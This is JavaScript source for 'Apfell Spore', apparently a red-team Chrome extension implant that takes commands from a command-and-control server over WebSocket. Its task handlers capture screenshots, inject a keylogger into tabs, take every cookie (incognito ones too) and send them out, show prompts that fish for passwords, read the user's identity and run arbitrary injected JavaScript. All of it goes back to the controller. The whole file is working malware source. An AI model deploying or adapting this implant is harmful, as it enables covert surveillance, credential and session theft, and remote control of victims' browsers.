// Apfell Spore Core Code
// Author: Chris Ross
// Purpose: Apfell Chrome Extension

// Core Spore Class
class SporeConfiguration {
    constructor(uuid, serveraddress, endpoint, port, ssl){
        if (ssl === true) {
            this.serverurl = "wss://"+serveraddress+":"+port+"/"+endpoint;
        } else {
            this.serverurl = "ws://"+serveraddress+":"+port+"/"+endpoint;
        }

        this.apfellID = 0;
        this.username = '';
        this.pid = 0;
        this.hostname = "chrome";
        this.UUID = uuid;
        // TODO: Add properties for the RSA and AES keys
    }
}

const config = new SporeConfiguration("blah", "127.0.0.1", "websocket", 443, true);
// Get the username
chrome.identity.getProfileUserInfo(function(info){
    config.username = info.email;
});
// Connect to the server
const connection = new WebSocket(config.serverurl);
let out = [];
let keylogTaskID = 0;
let keyloggers = [];
// Helper functions

/// TODO: Implement CreateKeyExchangeMessage function

/// Create a Callback Checkin Message
function CreateCallbackCheckInMessage(username, uuid, pid, addresses, hostname) {
    let msg = {};
    msg.user = username;
    msg.pid = pid;
    msg.uuid = uuid;
    msg.ip = addresses;
    msg.host = hostname;

    return msg;
}

function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data) {
    const msg = {};
    msg.type = type;
    msg.id = apfellID;
    msg.uuid = uuid;
    msg.size = size;
    msg.taskid = taskid;
    msg.tasktype = tasktype;
    msg.data =  data;

    return msg;
}
/// Convert a base64 string to data array
function base64StringToDataArray(data) {
    const byteString = atob(data);
    // write the bytes of the string to an ArrayBuffer
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return ia;
}

/// Make an HTTP Request
function httpReq(url,method,headers,body)
{
    const xmlHttp = new XMLHttpRequest();
    xmlHttp.open( method, url, false ); // false for synchronous request
    for (const p in headers) {
        if(headers.hasOwnProperty(p)) {
            xmlHttp.setRequestHeader(p, headers[p])
        }
    }
    const data_array = base64StringToDataArray(body);
    xmlHttp.send(data_array);
    return xmlHttp;
}

setInterval(function(){
    if (out.length > 0){
        // Pop and send a message to the controller
        const msg = out.shift();
        connection.send(msg);
    }
}, 5000);

function sendError(taskid, tasktype) {
    let payload = btoa(unescape(encodeURIComponent(JSON.stringify(chrome.runtime.lastError.message))));
    let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, payload.length, taskid, tasktype, payload);
    const meta = {};
    meta.type = 3;
    meta.metadata = envelope;
    const metaenvelope = JSON.stringify(meta);
    out.push(metaenvelope);
}

(function(){
    // Main function
    /// Receives and processes messages
    // Add a new listener to continually retrieve messages
    chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
        // Listen for events from other scripts
        switch (message.type) {
            case 'keylogger' : {
                const keydata = {};
                keydata["user"] = config.username;
                keydata["keystrokes"] = message.data;
                keydata['window_title'] = message.window;
                let payload = btoa(unescape(encodeURIComponent(JSON.stringify(keydata))));
                let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, payload);
                const meta = {};
                meta.type = 3;
                meta.metadata = envelope;
                const metaenvelope = JSON.stringify(meta);
                out.push(metaenvelope);
                break;
            }
            case 'formData' : {
                const formData = {};
                formData.user = config.username;
                formData.keystrokes = message.data;
                let payload = btoa(unescape(encodeURIComponent(JSON.stringify(formData))));
                let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, payload);
                const meta = {};
                meta.type = 3;
                meta.metadata = envelope;
                const metaenvelope = JSON.stringify(meta);
                out.push(metaenvelope);
                break;
            }
            case 'custom': {
                // catch output from custom javascript injected into tabs
                let payload = btoa(unescape(encodeURIComponent(JSON.stringify(message.data))));
                let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 10, payload);
                const meta = {};
                meta.type = 3;
                meta.metadata = envelope;
                const metaenvelope = JSON.stringify(meta);
                out.push(metaenvelope);
            }
        }

        sendResponse({});
    });
    
    connection.onopen = function() {
        // Send the checkin data
        const localAddresses = "127.0.0.1";
        const checkInMessage = CreateCallbackCheckInMessage(config.username, config.UUID, config.pid, localAddresses, config.hostname);
        //const envelope = JSON.stringify(checkInMessage);
        const meta = {};
        meta["metatype"] = 2;
        meta["metadata"] = checkInMessage;
        const metaenvelope = JSON.stringify(meta);
        connection.send(metaenvelope);
        console.log('Sent initial checkin');
    };
    
    connection.onclose = function(){
        console.log('Connection closed');
    };

    connection.onerror = function(error){
        console.log('WS Error detected: ' + error);
    };
    
    // handle messages from other events
    connection.onmessage = function (e) {

        const message = JSON.parse(e.data);
        
        switch (message["metatype"]) {
            case 2 : {
                // response to callback check in
                const checkindata = message["metadata"];
                config.apfellID = checkindata["apfellid"];
                break;
            }
            case 3 : {
                // process an apfell message

                const data = message["metadata"];
                const taskid = data["taskid"];
                const tasktype = data["tasktype"];

                if (tasktype === 1) {
                    // Screenshot
                    chrome.tabs.captureVisibleTab(null, function(img) {
                        // send back the base64encoded image
                        //console.log('Image '+img.toString());
                        if (img === undefined) {
                            sendError(taskid, tasktype);
                        } else {
                            let encImg = img.toString().split(',')[1];
                            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encImg.length, taskid, tasktype, encImg);
                            let meta = {};
                            meta["metatype"] = 3;
                            meta["metadata"] = apfellmsg;
                            const metaenvelope = JSON.stringify(meta);
                            out.push(metaenvelope);
                        }
                        
                    });
                } else if (tasktype === 2) {
                    // Keylog
                    let id = Math.round(parseInt(atob(data['data'])));
                    keylogTaskID = taskid;
                    let kl_js = 'let keys={};keys.type=\'keylogger\';keys.window=document.title;keys.data=\'\';document.onkeypress = function(e){get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys.data+=key;};setInterval(function(){if(keys.data.length != 0){chrome.runtime.sendMessage(keys);keys.data=\'\';}}, 10000);';
                    // Inject the keylogger script into tab id
                    chrome.tabs.executeScript(id, {
                        code: kl_js
                    }, function(){
                        if (chrome.runtime.lastError) {
                            sendError(taskid, tasktype);
                        } else {
                            const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}))));
                            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
                            let meta = {};
                            meta["metatype"] = 3;
                            meta["metadata"] = apfellmsg;
                            const metaenvelope = JSON.stringify(meta);
                            out.push(metaenvelope);
                        }
                    });

                } else if (tasktype === 3) {
                    // Get all cookies. Includes incognito cookies
                    let results = [];
                    chrome.cookies.getAllCookieStores(function(stores){
                        stores.forEach(function(store){
                            const filter = {};
                            filter["storeId"] = store.id;
                            chrome.cookies.getAll({"storeId": store.id}, function(cookies){
                                const data = btoa(JSON.stringify(cookies));
                                const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
                                let meta = {};
                                meta["metatype"] = 3;
                                meta["metadata"] = apfellmsg;
                                const metaenvelope = JSON.stringify(meta);
                                out.push(metaenvelope);
                            });
                        });
                    });



                } else if (tasktype === 4) {
                    // TODO: Implement task code for setting a cookie
                    let details = JSON.parse(atob(data['data'].toString()));

                    chrome.cookies.set(details, function(cookie){
                        let resp;
                        if (cookie === null) {
                            resp = JSON.stringify(chrome.runtime.lastError);
                        } else {
                            resp = JSON.stringify(cookie);
                        }

                        const data = btoa(unescape(encodeURIComponent(resp)));
                        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
                        let meta = {};
                        meta["metatype"] = 3;
                        meta["metadata"] = apfellMsg;
                        const metaenvelope = JSON.stringify(meta);
                        out.push(metaenvelope);
                    });
                } else if (tasktype === 5){
                    // TODO: Add code to remove cookies
                    let details = JSON.parse(atob(data['data'].toString()));

                    chrome.cookies.remove(details, function(cookie){
                        let resp;
                        if (cookie === null) {
                            resp = JSON.stringify(chrome.runtime.lastError);
                        } else {
                            resp = JSON.stringify(cookie);
                        }

                        const data = btoa(unescape(encodeURIComponent(resp)));
                        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
                        let meta = {};
                        meta["metatype"] = 3;
                        meta["metadata"] = apfellMsg;
                        const metaenvelope = JSON.stringify(meta);
                        out.push(metaenvelope);
                    });

                } else if (tasktype === 6) {
                    // TODO: List all open tabs with window titles
                    const queryInfo = {};
                    let tabs =[];
                    chrome.tabs.query(queryInfo, function(result){
                        for (i = 0; i < result.length; i++) {
                            const individualTab = {};
                            individualTab.window = result[i].title;
                            individualTab.url = result[i].url;
                            individualTab.incognito = result[i].incognito;
                            individualTab.id = result[i].id;
                            individualTab.active = result[i].active;
                            individualTab.highlighted = result[i].highlighted;
                            individualTab.windowid = result[i].windowId;

                            tabs.push(individualTab);
                        }
                        const data = btoa(unescape(encodeURIComponent(JSON.stringify(tabs))));
                        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
                        let meta = {};
                        meta["metatype"] = 3;
                        meta["metadata"] = apfellMsg;
                        const metaenvelope = JSON.stringify(meta);
                        out.push(metaenvelope);
                    });


                } else if (tasktype === 7) {
                    chrome.identity.getProfileUserInfo(function(info){
                        if (info === undefined) {
                            sendError(taskid, tasktype);
                        } else {
                            const data = btoa(unescape(encodeURIComponent((JSON.stringify(info)))));
                            const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
                            let meta = {};
                            meta["metatype"] = 3;
                            meta["metadata"] = apfellMsg;
                            const metaenvelope = JSON.stringify(meta);
                            out.push(metaenvelope);
                        }
                    });
                } else if (tasktype === 8) {
                    // form capture
                    // TODO: Form capture code
                    const data = btoa(unescape(encodeURIComponent(('Not implemented'))));
                    const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
                    let meta = {};
                    meta["metatype"] = 3;
                    meta["metadata"] = apfellMsg;
                    const metaenvelope = JSON.stringify(meta);
                    out.push(metaenvelope);
                } else if (tasktype === 9) {
                    // prompt

                    let txt = atob(data['data']);
                    let ans = [];
                    let pass = prompt(txt);
                    if (pass != null){
                        ans.push(pass);
                    } else {
                        ans.push('User cancelled');
                    }

                    const promptdata = btoa(unescape(encodeURIComponent((JSON.stringify(ans)))));
                    const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, promptdata);
                    let meta = {};
                    meta["metatype"] = 3;
                    meta["metadata"] = apfellMsg;
                    const metaenvelope = JSON.stringify(meta);
                    out.push(metaenvelope);
                } else if (tasktype === 10) {
                    // execute custom javascript code in a tab
                    let args = JSON.parse(atob(data['data'].toString()));
                    const tab = Math.round(args["tabid"]);
                    const code = atob(args["javascript"]);

                    chrome.tabs.executeScript(tab, {
                        code: code
                    }, function(){
                        if (chrome.runtime.lastError) {
                            sendError(taskid, tasktype);
                        } else {
                            const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}))));
                            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
                            let meta = {};
                            meta["metatype"] = 3;
                            meta["metadata"] = apfellmsg;
                            const metaenvelope = JSON.stringify(meta);
                            out.push(metaenvelope);
                        }
                    });
                }
            }
        }
        
    }
})();
